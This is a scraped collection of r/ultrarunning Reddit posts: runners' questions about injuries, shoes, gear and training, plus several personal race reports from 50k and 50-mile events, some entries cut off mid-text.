Pain on top of big toe knuckle,"Long time distance runner. Last weekend after my run (14 miles) the top of my foot hurt so bad I could barely walk. The pain was only on the top of my foot above my big toe knuckle. Was not painful to touch but hurt to walk on. Took a week off from running and the pain went a way after 3 days. Went out for a 13 mile run today and felt the pain come back around mile 4. Pain is a 5/10 so I ran through it and finished my run but it hurt pretty bad after. I have a 50k end of April, should I take more time off or continue running through it if the pain is minimal. I’ve done some research and loosened my shoe laces and changed to ladder lacing but did not seem to make too much of a difference.

Thanks for any advice or tips in advanced.",ultrarunning,1648925779

Achilles Pain - Help!,"Hey all: First time poster to this thread. I am a 30 year old male. Very active. Great shape. Mid-summer last year, 2021, I was able to return to sports once things opened up after the vaccine arrived and unfortunately I returned too quickly and hurt my achilles. I played two games of soccer and felt fine after other than being a bit tired. However, the next day was agony. I could barely stand, walking up and down the stairs was miserable and this persisted for a couple weeks and then died down a bit. However, I was still having consistent soreness, aches, and during every day life and even worse during sports. I went and got checked out to make sure I didn't partially tear it, etc.. and was assured by two docs that I hadn't and that it was just achilles tendonitis and it should go away with some PT and rest. I was diligent about my rehab (I have been through 2 knee surgeries and 4 shoulders and have a degree in the medical field) and am very conscious about listening to my body. The rehab really did nothing that I could notice. Fast forward to today and I am writing this because I have slowly gotten back and ramped back up into high intensity sports. Last Sunday I thought it was finally time to try full field soccer again. I had been doing long distance running, Insanity training, weight lifting, etc and I couldn't think I could do anymore before trying. My achilles felt fine. I played the full first half (45 minutes) and then called it. I am now dealing with pain again. Not as bad as it was the first time...the first time it was the full tendon it felt like from the insertion point on the heal all the way up to the meat of the calf...this time it feels just insertional. However, I am soooo tired of this and am looking for hopefully some insight and answers. I am an extremely active individual and feel super young at 30 to be dealing with crap like this. My doctor at one point joked with me that many people wish they just would have actually torn it so they could get surgery and be done with it and I am truly starting to feel that way too. Any insight, thoughts, answers would be truly welcomed. Thank you for your time.",ultrarunning,1648846879

iPhone app to test Aerobic Threshold,"Hey everyone, I recently built an IOS app that calculates your AET based on your heart rate drift.  I basically made it for myself so I wouldn’t have to pay for the training peaks premium account. Now I can test my aerobic threshold periodically to monitor my progress.

I’m wondering if anyone else would want to use the app? If I get enough responses I’ll put in the effort to getting it on the IOS app store, otherwise it will remain a personal tool.

You basically do the [HR drift test](https://uphillathlete.com/aerobic-anaerobic-threshold-self-assessment/) as you normally would, then in the app select the time range that you want to calculate HR drift for. If your run includes a warmup and cooldown, cut that time off.  
Currently this only works for outdoor runs since it calculates your pace, but I could easily add the functionality for treadmill tests as well.",ultrarunning,1648832187

 I'm a heavier runner so the soles probably take more of a beating than usual.

\### Training

For the first time in my running career I had a coach come up with my training plan.  Since this was my first attempt at 50 miles I felt someone with experience could be very helpful.  So I reached out to a local couple that are beasts and certified coaches.  They came up with a plan that worked with my crazy shift work schedule.  This was also the first time I had ran with a mostly time based plan.  Training went well and I  was about 90% adherent to the plan. Although a lot of my runs ended up being on the dreadmill due to winter storms and just ridiculous midwest weather.  The plan culminated in a 4 hour run with a 3 hour run the next day. Longest distance ran was 24 miles, with peak weeks of 52 and 54 mpw.  I have struggled with PF for the last couple of years, PF finally calmed down during this cycle but had a flare up of Achilles tendinitis , which was the cause of  missing a couple of training runs.  

&amp;#x200B;

\### Pre-race

The day before the race my fiance (C) and I drove up to Ottawa met with a friend, who was running the 100 miler,  we ate dinner with him and his wife and talked about the race and crewing.  It was both of our ladies first experience at crewing and they were both solo. Got back to the hotel drank a packet of LMNT electrolytes and got some shut eye.  Wake up at 0430, made coffee and drank another LMNT hit Mcdonalds for oatmeal and sausage burrito (didn't have a breakfast plan, really thankful that this didn't come back to haunt me) .

\### Race

  Race start at 0630, was planning on running with a couple guys from back home who were targeting about a 10 mm pace.  For the 50 mile race we had to hit the trail and head north for approx. 2 miles then turn around and go south until the turn around at 27 ish,  the 2 mile turn around was only chalk on the ground and a group of about 15 of us missed it and ran an extra 0.3 mile before realizing the error. No big deal right? Well that 0.6 mile is basically what I missed the 9 hour mark by....oh well.  

&amp;#x200B;

Miles 1-11 

Very smooth here, running with the other guys and just enjoying the day, we kept the pace in the 9:50 range.  I had 1 bottle with tailwind and 1 with water.  For food I was eating peanut butter no bakes and HUMA gels my plan was to have empty bottles at the first aid station and to eat roughly every 30 minutes.  Right away I fell behind on the eating but that was probably a little aggressive a plan so falling behind seemed to be ok. Temperature was in the mid 30s at start so I had waffle knit over my t-shirt.  Definitely started heating up close to first aid station.  The guys I was with had no plans of stopping at the station and I had planned for quick stops each one so we parted ways.  I rolled in and started stripping the waffle knit off and putting arm sleeves on while C filled water and another tailwind(no caffeine) bottle.  This stop was no more than 2 minutes and back on the trail 

&amp;#x200B;

Miles 12-18

Coming out of the aid station, there was part of me that very badly wanted to catch up with the guys and keep that easy running going, I  should have corrected myself and kept goal pace close to 10mm but instead I ticked off the next 3 miles closer to 9:10 pace, I did catch back up and we ran the next 3 or so together. Water was going well but I could start to feel that my stomach wasn't super happy with all the sweets.   This round I was better with food every 30 minutes. About a mile out from the next aid station I came to the realization that I had forgotten to tape my nipples....no lube either.  When I hit the next station, told C 1 water and 1 tailwind (caffeine) this time as corrected my tape error. Also took 2 salt caps and reloaded the HUMA gels and the pb cookies. Gave C a quick kiss and took off. This Aid station was more like a 4 minute stop.   

&amp;#x200B;

Miles 19-27

Left the aid station again wanting to catch back up with the group and rattled off 3 more miles at about 9:15 pace before I pulled myself back to that 9:50 pace. This stretch I listened to some music and enjoyed the scenery.  Even saw a couple turkeys strutting out in the field, it truly was a beautiful day.  Was definitely feeling some tightness in my hips and could tell my feet were starting to develop some problems.  This was a farther stretch between aid stations and I skipped the unmanned water (mistake) so I ran out of water about 1.5 from the station.  Hit the marathon in 4:18 which is my second fastest marathon ever.  Came into the Garnett turn around feeling good but had decided it was time to address some issues.  C got water and a LMNT packet going for me and I decided to vaseline the crap out of my toes/foot and not take off my socks (had I been running a longer distance this would not have worked out) I grabbed a bag of Doritos and talked with C for a couple minutes while eating/drinking. Left this station with water and LMNT (no more tailwind)  She was great with telling me what my friends/family were saying on FB and text messages. She really nailed being supportive without being annoyingly upbeat.  Her being a nurse may have helped here but I was just really appreciative of her questions and comments. I was at the aid station for about 8 minutes. 

&amp;#x200B;

Miles 28-36

&amp;#x200B;

This stretch was mentally the hardest, now running north into about a 10mph wind combined with running this entire section solo started to take its toll. My right calf started to develop a knot in it and my hips definitely were complaining.  I forced one last pb cookie and a HUMA gel but it was not something I wanted to eat.  I made sure to pound the water and refill at the unmanned station. Turkeys were still strutting on my way back through.  No music no podcast just running.  The last couple miles I started taking walk breaks...not very long, keeping the average pace around 10:20.  When I hit the aid station I went straight to the flat coke and potato chips. Also had half an orange.   I sat down and talked with C and took a couple salt caps. I told her I was going to finish and that I would be a little slower through the next aid station.  Gave her a big hug and kiss and left feeling ok.  I wasn't up or down at this point, just resolute that I would finish. 

Water only here and I was really pounding it. I was definitely looking forward to the short trip to the next station.   

&amp;#x200B;

Miles 37-43

&amp;#x200B;

More solo miles, the coke really helped my stomach and my mood.  I resolved myself to running as far as I could then picking spot to walk to and start running again.  I averaged around 11mm here.  I spent some praying and thanking God for the ability to do this.  Running has always been a spiritual thing for me so this is normal.  I really wish I had a pacer for these miles. I think I probably could have pulled out a better effort with someone to distract me.  Not much to say about this stretch, didn't really fuel through here. Will definitely have to work on more fueling if I am going to run farther than 50.  This aid station was the OUTLAW crew and they really brought the energy.  I grabbed a cup of coke and one of the aid station members stood there with a bottle of coke refilling me until I was good.  I think I grabbed some more chips here but I can't remember. C missed my arrival and was about a minute late getting to me but I was just drinking coke so no big deal.  I had some bacon here....bacon really does help everything. I spent about 7 minutes here, it really felt longer.  At this point I looked at my watch and realized without a doubt I would finish under 10 hours and with a little luck might pull under 9. So I told C I was gonna go for it, gave her a big kiss and took off.  I distantly heard the Outlaw crew say I would get more than a kiss if I finished lol ...those guys were great! 

&amp;#x200B;

Miles 44-50.6

&amp;#x200B;

I averaged right at 11:15 for these miles and it was more run/walk.  I started watching the time more and I was actually managing a good  pace when running I just couldn't stick to it for long.  My quads were screaming and that right calf was not happy.  I just kept pushing as much I could and made sure I could run the last bit to the finish line.  My watch hit the 50mile mark at 8:58 but official time was 9:04 with the extra 0.6 that we ran.  C was waiting for me at the finish line after a big hug with tears in our eyes I sat down.  

&amp;#x200B;

&amp;#x200B;

\### Post-race

My legs were a little shaky afterwards but I didn't  cramp, which is a first for me. I pulled my shoes off but left the socks on and left the race in my oofos slides.  We drove down to the 100 mile turn around to give my friends wife, my leukotape for his feet. He ended up dropping due to blisters at 61.  We headed home and celebrated with fajitas, tons of chips and salsa and a nice tall brew.  Now being a few days out I have been on a couple short runs, my quads are still really sore.  My pinky toe will never be the same.   All in all an amazing experience.  I am already looking at finding a great 100 miler after Chicago this October.  C was a rockstar in her crewing debut.  A handful of changes and I will be good to go. I am not much of a writer so bravo for making it this far if you did.

Shoes selection for Patagonia Run 75K,"Hi redditors! I'm trying to finish my second 75K (almost 50M) in two weeks, and I haven't decide what shoes to wear, I'm a 80 kg male with some overuse peroneal tendons injuries in my back.

Last time I ran 75K on 2017, I got injured over 60 km, was wearing Nike Wildhorse 4 wich think there are a little ""rigid"" for that kind of mileage. (experience tells :/ )

Now I have some more ""comfy"" riders to choose from:

* Brooks Caldera 4: Pretty bouncy ride, but lot of cushion. Firmer
* Nike Pegasus Trail 3: Very cushioned, none bounce, no much control over rough terrain. Pretty soft.
* Saucony Peregrine 11: The less cushioned, but better traction. Firmest (?)

The event is Patagonia Run in San Martin de los Andes (Argentina), I don't know the track for sure, but I guess there is a lot trail running, with little technical segments or super step heels.

I've ran plenty on every shoe, like 80K at least, which one do you think would be better ?  Are Peregrine to firm for my weight and distance ? Will Pegasus suffer from less grippy outsole ?

Other option will be to take two pair of shoes, I can switch them at kilometers 20 and 50.

No Sleeping or No Eating?,"So last night my daughter posed a question to me as an ultrarunner, would you rather not HAVE to sleep or not HAVE to eat.

"Blood work before and after an unassisted 100 km attempt (Failed, stopped at 50 miles mark)","I wanted to run my first 100 km without any assistance and do a blood work before and after just out of curiosity and kinda wanted to show to anybody else who's curious about ultrarunning that nothing critical happens to our bodies if we attempt something like this.  


In short about the run:

* Expected to do 100 km for 12 to 14 hours
* Instead did 50 miles at 11h 14m

&amp;#x200B;

Not excuses but rather mistakes I made and lessons to learn for future planning:

* Weather in spring is quite dangerous. Forecast was showing cold and huge wind, it turned out to be true, but also sun was shining and literally killing me with heat every once in a while. So basically you run comfortably in cold with several layers of clothes, then sun is out - you are sweating, then there's the coldest wind ever - and you are freezing in a matter of seconds
* Didn't train enough running with a backpack full of stuff. Since I didn't have any assistance I could rely only on my backpack and one gas station at a 42 km mark. Because of that I put much more stuff than usual making it weigh around 4-5 kg which increased my average heart rate
* On a gas station I didn't want to lose a lot of time in order to keep myself warmed up, so when I realized that hydration bladder is pressured by the other stuff that is in the main compartment and can't be filled up properly, I decided not to get all of my stuff out and then back in. Just took a risk and left with less water than I could get hoping for a colder weather ahead
* I ran comfortably at a slow pace for 50km and then my feet were just ruined, not sure why. Never had them in such pain before and it's not the first time I run 50km. Still the biggest puzzle for me. I continued walking/running for a while and then just walking as fast as I could
* I didn't sleep well (3-4 hours) and woke up at 2AM, by the time I was over 30 miles in I started to fall asleep literally when running/walking. The body would just become soft and try to put me to sleep. Fighting that was the hardest part probably. I assume it was because of the weather constantly changing and messing up with my core body temperature
* I didn't have any plan B on how to get back to the city I came from so at 50 miles mark I figured if I continue walking the rest of the way I can miss the last train back to my place. So I decided to stop from there and hitchhiked the rest

&amp;#x200B;

About the blood work: 

* I'm not a doctor but by the amount of red and yellow squares on the right I would say it isn't bad at all, like it wasn't a huge stress on my body

&amp;#x200B;

Just wanted to share my journey, maybe it helps somebody else to plan better and/or even motivate to attempt longer distances. Cheers everybody!

"First 50 miler in 2 weeks. Less than stellar training cycle, feeling nervous but cautiously optimistic.","I had an unfortunate March, running wise. Took 12 days off with a wonky hip issue. Luckily it didn’t bother me doing other exercise so I was at least able to get a pretty solid amount of other activity in (couple of good hikes, lots of time on the stationary bike, lifting). I eased back into it pretty gently with a few slow short trail runs and eventually managed a better than expected 20 miler last Sunday (4 hours, moderate elevation, about 1400ft gain). And another decent 12 miler a couple days ago. I’m disappointed about having to take the time off but glad I am feeling back to normal now. And kind of a happy accidental result of this experience: trails feel way better than road right now (I normally run primarily on roads just out of convenience), so I’ve been really going out of my way to get to the trails and getting a lot more time in the woods than I normally would. 

I adjusted my goal from &lt;11 hour finish to making the cutoff time of 13 hours and plan to just be conservative and try to enjoy myself. And finish, of course.

I live in France in a place where trails are quite steep, and I am training for very steep races, so I use my poles a lot.
But I tend to have very weak arms. Do you have any strength training exercise you practice to make your arms stronger and help you be more efficient when you push on your poles?

Any cannabis smokers doing 100milers?,"How does your body react to smoking and distance running? 

I am a somewhat heavy cannabis user and turned my focus on doing my 1st 100miler. I am wondering if my smoking is bad for what I am about to do. 

From your experience: 
1. Yes, smoke and run 
2. Smoke less and run 
3. Smoke only after your runs 
4. Cut out smoking for the next 28 weeks 

Thus far doing about 30miles per week I do not experience any noticeable ""bads"" from smoking before/during runs. Only cotton mouth 🤓",ultrarunning,1648455395
Beginner running 125km trail race in September,"Kind of a long story so I’ll put a tl;dr at the bottom. 

So, I’ve been feeling a little trapped in life and was looking for something different. I’ve been smoking since I was about 12 (I’m in my mid-thirties now) and really wanted to quit because I have a 1.5 year-old at home. 

Anyways, last week I decided I was going to quit and threw out the rest of my smokes and signed up for a 125km race. I have very little of a running background but I ride my bike pretty much anywhere and go on long hikes carrying my kid in a backpack. 

I’ve gone for two runs so far 1) 5km with 250m elevation gain and loss in about 30 minutes; 2) a 9km run with a little under 290m gained and lost in a little under an hour. 

I have found a training plan that seem good. Basically i progress running 3 days a week, then 4, then 4 with two long runs back-to-back, and finally 5 days for two weeks with 3 long runs on back-to-back days. 

I fully understand that I probably won’t be able to finish the 125km race. But, it has really been helping me stop smoking. 

I was wondering if anyone had some advice to make it more likely for me to finish? I’ll have about 21 hours to finish the race

tl;dr: Signed up for a 125km race after quitting smoking. I have a training plan but was looking for any advice to help maximize my chances of finishing. Can run 9km in a little under an hour on hilly trail",ultrarunning,1648429018

# Intro

For those of you who haven't heard of this hellish race, the [OPSF 50/50](http://www.opsf5050.com/) purports to be the ""toughest race in Indiana."" Did I put much thought into this when choosing the race? Nope. I just wanted to do 50 miler and the date of this race matched up with my desired time frame. I am an idiot. Whatever. No regrets. I had a weirdly good time and learned a lot about problem solving during 50 mile races. Will I sign up for another fitty? Absolutely. Will it be the OPSF 50/50? LOLnoway.

# The Course

I've run technical trails, I've run big vert, I'm no stranger to mud. But this race somehow seems to combine all three in the most...obstructive sort of manner. The course is a 14 mile loop with a tail (""a lollipop"") in the Owen Putnam State Forest - a beautiful area in central IN. Unfortunately, the trails in this beautiful area are meant for horses and fed by natural springs, which leads to permanent, deep mud. To add to the mudfest, it rained off and on all week. Lots of mud. Lots of horse poopy. RIP shoes.

Though the course is a fucking natural disaster, I will say that the race staff did a terrific job of marking it. I never once came close to questioning my route.

# The Race

A few days leading up to the race, I took the advice of several r/ultrarunning posters and started front-loading electrolytes. This primarily took the form of pedialyte (which now has a sports version wut????). My hydration game was on point throughout the race and I very much credit the front-load with that success. I don't think I was necessarily making terrific decisions on race day, so it was good to have that base to work with. It was also cold as hell all day (mid and low 30s), so I wasn't exactly sweating a ton.   
FWIW, my race day hydration strategy was a 2 liter bladder of water in back and one 500ml soft flask up front of electrolytes. Started with Pedialyte sport (should've brought more of that golden nectar of the salt gods) and ended with Nuun Sport. Continual sips of all the above. TMI: I peed at every aid station and twice in the woods, so that was a good sign imo. There were three aid stations: start, A, and B. Start to A was &lt;3 miles, as was A to B. B back to A (around the other side of the loop) was 5.8 miles, then A to start was, again, &lt;3 miles. So really the only ""distance"" I needed to account for at any point was the 5.8 between B and A...which seemed like a damn eternity toward the end.

The OPSF 50/50 consists of 3 races: 14mi, 50k, and 50mi. The two 50s started at the same time, while the 14mi bastards with their fresh legs and clean shoes rolled in 3 hours later. I ran with various pockets of 50k folks for short stints during the first chunk of the race. All but one fellow had run this course before and LOLed when I said I hadn't. Fair. I would have, too. Holy hell. If you ever sign up for this race, visit the course. I heard all sorts of ""oMg ThE MuD!"" comments from past racers, but realized .25 miles into the race, I didn't know the meaning of mud until race day. Ankle or mid-calf deep mud covered a good 40% of that damn course - and that's a conservative estimate. That's also why my goal of a 12 hr finish expanded to ""shit, let's just beat cut-off in one piece.""

I ran my standard Saucony Peregrines and they performed as well as any shoe can in that scenario and drained super well. Weirdly, after 14hrs of wet feet, I came through only one blister that I didn't notice until I excavated my feet from their muddy tombs after the race. I'm chalking that up to Smartwool socks (which wet-molded to my feet) and sheer luck. I noticed a SOLID percentage of the race field were running Altras of some sort. I'm not a 0 drop kid, but given how light Altras tend to be, it might be worth a look. Because you're gonna gain a solid pound+ in caked on mud and wet socks after a few hours.

I was on pace to finish in 12hrs - and actually ahead of schedule up through about mile 28. That's when the fugginnnnn bonk hit, compounded by the mud boots I'd gathered up to that point. This was my first experience with a hardcore bonk - and if there's one thing I've learned from this fantastic Reddit community, it's that bonks will pass with a combo of strategic nutrition and mindset re-calibration. So I did that. My dumb ass had done the 1 thing you're not supposed to do and switched up my nutrition day-of (it was a last minute travel thing). So I reverted back to my comfy GU + water + Nuun routine and boom. Prob solved. I did build up a bit of a deficit that I don't think I ever really recovered from, but I got back to the land of the living. Note that this race is one that does NOT have GU as a standard aid station grab. They stick to mostly potato chips and clif bars - things that did not sit well with me. For the brain stuff, music. Busted out the earbuds around mile 30 and had a SWIFT brain change. What's kind of funny in hindsight is the music I randomly landed on was Lady Gaga (????) who's not in my general wheelhouse. So yeah. My bonk was cured with GU and (Lady) Gaga. Idk. Shit gets weird when you're in the woods alone for 14 hours.

Post-bonk miles 30-40 went super smoothly and I got back to a respectable pace. After mile 40, though, I think the ""yes! homestretch!"" mentality hit a bit too soon and I had to stop looking at my watch because those miles draaaaaagged. This was also when I just...stopped seeing other people. I wasn't really looking for company. I like solo running. It's just always nice to see other signs of life when you're aboard the struggle bus. As noted earlier, the bonk stage messed up my nutrition a bit and I was definitely feeling that deficit manifested as general muscle fatigue around mile 41 or 42. It became harder to slog up and down those muddy hills and I swear it had gotten muddier over the course of the day. May have just been mental, but whatever. I tried to shove in more calories, but I had definitely reached the limit of what my body would process. Side note: This is when I tried Tailwind for the first time. They had some at the aid stations. I'd never trained with liquid calories, so it was weird. But at that point in the race, fuck it. It was at least staying down, so...cool. I ended up only doing a soft-flask and a half, though because pretzels and Nuun felt better.

One mile from the end, I see a guy with a headlamp running toward me. ""Hey! I didn't realize there was still someone out there!"" LOL always great to hear you're holding up the race... It was one of the staffers doing sweeps and this gem of a man kept me company over the last mile. He was one of those tall, thin, mid-50s dudes that had clearly been owning ultras for years and I swear he just floated above the mud as I sank with each step. Whatever. It was totally dark, I was freezing and couldn't feel my hands anymore (even with gloves) bc my body was donezo, and it was great to have someone distract me from that. When I crossed the finish, all I could think was ""HOLY BALLS"" and didn't realize I'd said it out loud until a few folks looked over at me.

I was looking so forward to the grilled cheese I was promised, but ended up only being able to eat half. I wasn't nauseous or anything, it's like it just didn't fit in my stomach. I was pissed bc it was delicious. Most of the race staff was outtie by the time I ran in. But some of the ones I'd connected with throughout the day were still there and they went out of their way to make me comfortable and chat about the day (shout-out to Esther!). Good folks all around.

# Hindsight And Other Thoughts

1. The last ultra distance I ran pointed out some major glute, hip, and calf weaknesses. As a result I was very intentional about incorporating a strength routine into my training for this race. I think that worked really well for the most part as I'm certainly struggling today, but nothing like previously - and none of the pain is from muscle strains or tendon issues. Just general ""you've been running for 14.5 hours"" pain and inflammation. That said, this race really did trash my quads by the end. I'd trained downhills, but not technical mudslide downhills framed by steep ravines (i.e. ""shitshitshit don't slide and fall off the side"" hills). I'm honestly not sure how I would train for that sort of thing living where I do? But hey. I'm sure devoting even more effort to downhills and quad strength in general wouldn't hurt.
2. The staff were an absolute delight to interact with. The field was already small, but shrank substantially over the course of the day. One staffer said the 50 mile field started with 22 or 23 folks? and ended with 11. So everyone at aid stations knew my name (rather than just calling me ""runner"" or whatever) and that had a HUGE impact on morale. I didn't realize until the end that only two females (including myself) ended up not DNFing the 50 mile race, so I guess that certainly makes the name recall easier lol. And yeah. I finished DFL of all the 50 finishers, but still got a 2nd place overall female award since there were just 2 of us left. I LOLed when they handed me that award. But know what? I finished and I'm pretty stoked on that. :)

Sunglasses--lens color?,I'm ready to get a new pair of sunglasses and was thinking that maybe something other than the average regular dark shade would be better for running in the woods.

First Ultra (50K) in 2 weeks - Drop Bag and General Advice,"Hi /r/ultrarunning! 

I am running my first ultra (50K) in a couple of weeks and I am trying to make sure I have everything I could possibly need for the participation (it will definitely will not be a race, my goal is just to make it to the finish line before the cutoff...preferably in one piece). 

I have a list of things I will bring in the drop bag: 

* Dry clothing
* Socks!!
* Extra pair of shoes
* Food

In my vest I will definitely have food and water to last me from one Aid station to another, first aid kit and things like ziploc bags, TP, hand sani and wet wipes. 

Is there anything else I should add to the list? 

And has anyone taken Immodium before the race? My stomach is usually OK during long runs but I don't want to take any chances. 

And if you have any general tips and things you wish you would have known before your first participation in an ultra, please shoot them my way!

"Race Report: ""The Ballad of Leroy Jenkins""","**Who:** Myself

**What:** Wicked Revival 50k

**When:** 12 March 2022

**Where:** Lowell, NC

**Prelude:**

After 5 and a half years of being a CrossFitter and coach, I left my affiliate. It had been coming for a while. I had grown increasingly disillusioned and distant with the ownership till it came to the inevitable head. I didn't really leave with a plan to maintain my fitness. For a good period of time, I dropped in at another affiliate, worked out in my friend's garage, and on my darkest days went to Planet Fitness. I simply was not interested in having to rebuild at another affiliate and go through the effort of forging new relationships that in my experience ended as soon as I walked out of an affiliate. I found myself with too much time, too much silence, and was ultimately unfulfilled with my fitness. I tended to operate best with a goal and work towards that goal, but I simply did not have one. I was listening to a podcast and the lead gentleman, who primarily ultraruns but dabbles in CrossFit, ranted how CrossFitters are so quick to complain about running but boast how hard their workouts are. He challenged CrossFitters to do an ultrarun and see which was harder. Within hours I got on Ultra Signup, found a 50k 10 minutes away from my grandparents' house, and signed up having never run longer than a 10k.

**Training:**

I started to train in late September of 2021. Armed with some barefoot shoes, I traversed the many roads near my house. It hurt. My ankles and knees to a pounding. It really wasn't uncommon for me to slide around the house the next morning after a run because my ankles hurt so bad. Over time, it hurt less but I eventually bought some Hoka's and it vastly improved my running experience and recovery dramatically. My running regime essentially was solely based on getting miles in and that was based on going up 10% from the previous week. No speed, no tempo, no hills, just mileage. I felt what gym folks refer to as ""noob gains"" and my runs became increasingly faster and further. Before Thanksgiving, I ran over a half-marathon for the first time ever in under two hours. I was intoxicated by it. I actually changed my registration to run the 50-mile option. There was this nagging sense I really have no clue about what I'm doing, but I genuinely felt that if I asked for guidance I would be told to tone it down or push the race back. I continued increasing mileage to eventually 48 miles a week before Christmas and then just enjoyed the holidays looking to pick back up in January. 

January did not go as planned. I slowly picked running back up and then I got sick. Postsickness I did not feel great running and simply didn't make many attempts to get mileage. The mileage needed for me to complete the 50-miler seemed to be unobtainable. I went to Oklahoma for two weeks at the end of January and the first week of February and did not want to face the elements. I changed my registration back to the 50k and got my mileage minimums of three weeks of 30 miles before race week culminating in a 17-mile road run. I was undertrained but I felt confident because I was uninjured and had no nagging pains. At no point in my training did I actually run on a trail. 

**Race:**

My Grandmother was hospitalized the week of the race and was having a really hard time in the hospital. One of the reasons I chose the race was due to the proximity of the race to my Grandparents because my Grandmother deserves the title of ""#1 Fan"" and I really wanted her to be present when I finished. That was no longer a possibility. I visited my Grandmother in the hospital Friday and spent some time with her, it never dawned on me that I was with her in her final hours. That evening I had a delicious meal of pancakes at Cracker Barrel with my Grandfather, Aunt, and Uncle and went to bed at 8 pm. 

I slept like a rock and woke up about 6:15 am. I had everything ready to go and slipped into my gear. Before I left, I spoke on the phone with my Grandmother who wished me well and that she could be there. My grandfather and I talked for a while and he asked if I heard the storm the previous night. I hadn't, I was completely undisturbed by the storm. When I left for the course I was just glad it was not raining.

It was a fairly miserable morning in terms of weather. Overcast, wet, and windy. I went through the registration process and got my bib, only to come to the realization I had no idea how to put on a race bib and I damn sure wasn't going to ask anyone. I went on my car to hide this and a quick Google search later, I had it situated. I organized my race ""nutrition"" consisting of gummy bears and pretzels and having not eaten breakfast started munching on my gummy bears. I had to force myself to stop. I prepacked this to be eaten on the run and here I was in my car turning into some ravenous Gummy Goblin. I took a Gu energy packet, put on my Aftershox, and walked over to where the other runners were starting to gather. It amused me to no end that none of the other runners were warming up or stretching. The race director explained the race, the course consisting of 10 mile loops, and we started at 8:00 am sharp.

I felt as though everything started fairly well, then we got into the trails. The storm the night before turned the course into mud and I ate it coming off a bridge within the first half-mile. The worn Hoka road-running shoes I wore were very much not cut out for the task. I found that trying to avoid the puddles only ended in me eating it so I started just sloshing through them. The runners ahead of me turned around a little past the first mile believing they had gone the wrong way and a seasoned gentleman came up and turned us back around. I decided to follow him for the next 9 miles and it was one of the few smart decisions I made that day. He kept a very good pace alternating between running and jogging and I shadowed him trying to keep some respectful distance. If it was not for him I would have been lost numerous times on the loop. We finished the first loop in a little over two hours. 

The gentleman introduced himself to me and was very gracious, I genuinely hate I lost his name. He mentioned he was going to talk to me but I had my Aftershox headphones in. I refilled my water and went to the restroom, somewhere in this time I had the idea I could run faster. I maybe took five minutes at the end of the first loop and got back for my second alone and unafraid. This was perhaps the most foolish thing I could have done. In hindsight, I should have put away my headphones and run with this gentleman for the remainder of the race but I have to learn things the hard way. 

I was moving hard for miles 10-14. I was hydrating and eating my half-frozen gummy bears. I genuinely felt great. Before mile 14 I turned around because I was questioning if I was on the right path and fortunately another runner came up and turned me around the right way. I followed him but within half a mile his stride carried him away from me. At this point I noticed a gentleman coming up behind me and I became very conscious of my pace and sped up. At some point, I missed my turn and I found myself lost near a rough neighborhood. There were all sorts of trash in the woods that I knew I did not see on my first loop. I hate the sensation of being lost, especially being timed as well. I pulled out my phone and shot a panic azimuth with the compass app. I, fortunately, was able to make my way back to the correct trail but was rattled. It seemed at the critical juncture of the race, I totally fumbled my time and placing by getting lost. I ground it out till about mile 18, I was going downhill slipped and planted my left leg hard to stabilize myself. My knee extended, I felt pressure, and fortunately, my heel slipped before it hyperextended or ligaments. I slid down a few yards and could feel my composure slipping. Continued to run and got to a juncture I had no memory of and got off course. I never thought about quitting but the day was slipping away from me. I was expecting the physical exertion but being lost on the course never entered my thoughts as a possibility. I made it back to the start point and was starting to become distraught.

The race director was very gracious, I showed him my GPS that said at that point had ran 20.5 miles. Got a bacon and cheese quesadilla and he asked where I got lost at. Told him where and he was very encouraging.  I went into the last loop thankful the sun finally shone through the clouds. It wasn't fast, it was very methodical and I was not going to get lost on the trail again. I don't think I was doing a great job with hydration and nutrition by this point, there was a great deal of power walking. I guess I potentially bonked? I was well into uncharted territory in terms of distance. I only took one fall on the last loop and did not get lost again. I remember during this lap taking in the moment, at the beauty of nature and how I was going to complete something a year ago I never perceived myself doing. 

I finished with a time of 7:36, but I continued doing laps on a nearby soccer field because I wanted my phone GPS runtracker to show the distance as 31 miles. I noticed the car of the gentleman I ran the first lap with was gone. I was beat and glad I did not attempt the 50-miler. I sat down and talked with the race director for a few minutes, but I did not really feel accomplished. I knew I was capable of better, I was frustrated by being in a hurry to get lost, and I wished I could have shared this moment with someone I loved. Ultimately, I was humbled by the day and thankful to leave uninjured. I changed out of my muddy clothes and began my hour and forty-five-minute ride home calling friends and family telling them about my experience. 

**Epilogue:**

My grandmother's health took a nosedive that Sunday and she passed away Monday afternoon. It hit me extremely hard. I am so fortunate to have had such a woman in my life and I am thankful for the time we shared together. She never doubted my ability to do anything and was so eager to support me in whatever shenanigans I got into.

Chuckanut 50k Race Report,"For my first experience on the Pacific Northwest, I could think of no other race I’d want to do than Chuckanut. The race director, Krissy Moehl, has been putting on this classic event for 20 years and it seemed perfect to open up my season with something that has a bit of everything, flat, climbing and beautiful views.

The course has 5,000 feet of elevation change and all of it occurs in the middle 30k of the race. The first and last six miles are on a flat rail trail. I knew these sections would be my strong point. My training this winter has been a lot of winter roads and mostly zero elevation gain. I keep up with strength and mobility drills including mountain legs and uphill strides. There is that, and then there is a three mile sustained climb, which are just different stimuli.

I arrived to the PNW on Thursday night and spent Friday exploring Seattle mostly on foot. I didn’t overdo anything and my legs felt really good before and during the race. The only thing I’d change about my week leading into the race would be my diet of oatmeal, but I will get into that.

The morning of I drove to Bellingham in the rain. The day before was gorgeous with spots of sun. I spent the afternoon reading outside in the park wondering how I got such a lucky day. The rain began early morning and got the trails nice and soft for us. It slowed down by the start, but I still opted for a rain shell and gloves which was a good idea. On some of the ridges it was windy and I got chilled as my sweat dried to me. I have no regrets about my clothing choice.

I used a handheld with Gnarly nutrition and ate about 6 gels over the course of the race. After I finished my bottle I drank Hammer from the aid stations.

The first six miles were wonderful. I saw Ladia Albertsan-Junkans and Rachel Drake at the start line, familiar faces are always welcome for me in a new place. I also was able to warm up a bit with Drew Holman, Tyler Green and Preston Cates running into them on an out and back section of trail. They had on these rad matching yellow jackets which I thought must be to prevent hunters from mistaking them for the deer they could outrun. At the start line Krissy grabbed a bunch of us women to lead the race which was kind of fun. 

The gun went off and we settled into a nice pack chatting about different things. The first few miles went by so quickly and I was feeling really strong. To be honest my body feels great. I knew what effort I wanted and tried to keep it there. The objective for the race was to run hard but not leave my future races here. It was during this stretch that these two blond women (who were also tall which is why I took notice) who looked so comfortable blew by our pack. They honestly looked like they were doing this as a warm up and then we’re going to soccer practice. Beautiful strong calves and dressed to throw down. I would leap frog these two many times during the race because we discovered all of us needed to practice running slick technical downhills more often.

